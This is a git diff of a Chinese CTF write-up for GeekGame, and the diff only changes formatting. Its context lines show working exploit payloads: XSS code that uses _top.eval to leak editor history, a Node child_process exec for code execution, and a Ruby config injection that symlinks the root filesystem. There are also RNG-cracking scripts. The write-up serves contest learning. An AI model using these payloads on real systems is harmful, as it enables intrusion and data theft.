@@ -13,11 +13,11 @@ License: [CC0 1.0](https://creativecommons.org/publicdomain/zero/1.0/deed.zh-han
 
 又是新的一年，这是我参加的第二次 GeekGame，题目还是一如既往的有趣。对于思路和其他人类似的题目我就不打算再写了，预期本届官方 [资料存档](https://github.com/PKU-GeekGame/geekgame-4th) 会有更详细的解法。本 WP 包含：
 
-- [概率题目概率过](#概率题目概率过)
-- [ICS笑传之抄抄榜](#ics笑传之抄抄榜)
-- [好评返红包](#好评返红包)
-- [随机数生成器](#随机数生成器)
-- [神秘计算器](#神秘计算器)（非预期）
+- 概率题目概率过
+- ICS笑传之抄抄榜
+- 好评返红包
+- 随机数生成器
+- 神秘计算器（非预期）
 
 <!-- more -->
 
@@ -31,7 +31,7 @@ License: [CC0 1.0](https://creativecommons.org/publicdomain/zero/1.0/deed.zh-han
 
 所以推测原生的 JavaScript 函数都可以通过 `_top` 调用，[源码](https://github.com/probmods/webppl/blob/daabd60361f72eef53f69005751facce34c7f916/src/header.js#L158) 也可以验证这一点。
 
-```JavaScript
+```javascript
 var exports = {
   _top: util.runningInBrowser() ? window : global
 };
@@ -43,7 +43,7 @@ var exports = {
 
 浏览器环境下，XSS Bot 模拟的行为是：
 
-```Python
+```python
 def run_code(c):
     # click the editor
     # delete everything
@@ -71,13 +71,13 @@ print('\nThe page title is:', title)
 
 两种思路都可以试一试。通过审查元素得知编辑器是 CodeMirror。如果搜索不到 CodeMirror 怎么获取历史记录，也可以先搜索怎么获取 CodeMirror 的实例，搜索关键词 *CodeMirror get instance* 很容易找到：
 
-```JavaScript
+```javascript
 document.querySelector('.CodeMirror').CodeMirror
 ```
 
 然后在提供的 WebPPL 网站内把玩一番 CodeMirror 对象，自然发现有 `getHistory` 方法。所以最后的 payload：
 
-```JavaScript
+```javascript
 _top.eval("_top.document.title = _top.JSON.stringify(_top.document.querySelector('.CodeMirror').CodeMirror.getHistory())")
 ```
 
@@ -85,7 +85,7 @@ _top.eval("_top.document.title = _top.JSON.stringify(_top.document.querySelector
 
 第二问：
 
-```Python
+```python
 def challenge_2(code):
     if not Path('/flag2').is_file():
         print('Cannot find flag file!')
@@ -108,7 +108,7 @@ def challenge_2(code):
 
 通常思路是 `require('child_process').exec`，但是这里的环境没有。不过好在 WebPPL 装起来并不麻烦，可以本地把玩一下发现 `import` 还是可以用的。payload：
 
-```JavaScript
+```javascript
 _top.eval("import('child_process').then((m) => {m.exec('/tmp/getflag', (error, stdout, stderr) => {console.log(stdout)})})")
 ```
 
@@ -152,7 +152,7 @@ We get a good deal of traffic on this list, but we'll make our best effort to ge
 
 所以在配置文件开头加上我们想执行的代码就可以了。
 
-```Ruby
+```ruby
 # course.rb
 # 一开始没提示 flag 在哪，所以可以创建一个链接慢慢找
 system("ln -s / /home/app/webapp/courses/Geek-ICS/root")
@@ -175,7 +175,7 @@ system("ln -s / /home/app/webapp/courses/Geek-ICS/root")
 
 第二阶段精简后的 background.bundle.js：
 
-```JavaScript
+```javascript
 chrome.runtime.onMessage.addListener(async (e, o, i) => {
     if("imgUrl2Base64_send" === e.action) {
         var a = e.message;
@@ -220,7 +220,7 @@ chrome.runtime.onMessage.addListener(async (e, o, i) => {
 
 查看 contentScript.bundle.js：
 
-```JavaScript
+```javascript
 chrome.runtime.sendMessage({
     action: "imgUrl2Base64_send",
     message: e
@@ -285,7 +285,7 @@ chrome.runtime.sendMessage({
 
 这个事件是怎么找到的呢？background.bundle.js 也有，但是比较绕，contentScript.bundle.js 的逻辑相对清晰：
 
-```JavaScript
+```javascript
 window.addEventListener("sendDataToContentScript", c);
 ```
 
@@ -301,7 +301,7 @@ Z3 魅力时刻。
 
 以 Go 为例：
 
-```Python
+```python
 # 因为 int32 随机数生成是 int64 取高 32 位
 # 所以和上面网页给的递推式略有不同
 # xn = x(n-273) + x(n-607) (mod 2 ** 32)
@@ -364,7 +364,7 @@ $$
 
 然后你会发现只知道部分位，还原 MT19937 的库已经有大善人 [写好了](https://github.com/icemonster/symbolic_mersenne_cracker/tree/main)，直接拿来用就可以。
 
-```Python
+```python
 def solve():
     # 每行一个数字，我们取前 1900 个数字求解
     nums = []
@@ -419,7 +419,7 @@ $$
 
 发现取整还是有点误差，稍作调整：
 
-```Python
+```python
 pell = lambda n: ((1+2**(1/2))**(n-1)-1/2)/2**(3/2)//1+1%n
 ```
 
@@ -477,7 +477,7 @@ $$
 
 总结起来：
 
-```Python
+```python
 def pell(n):
     A = 4 ** n
     M = A ** 2 - 2 * A - 1
@@ -486,7 +486,7 @@ def pell(n):
 
 即为答案。A 如果不够大可能会有错误，可以适当调整。
 
-```Python
+```python
 pell = lambda n: 4**n**2%((4**n-1)**2-2)%4**n
 ```
 
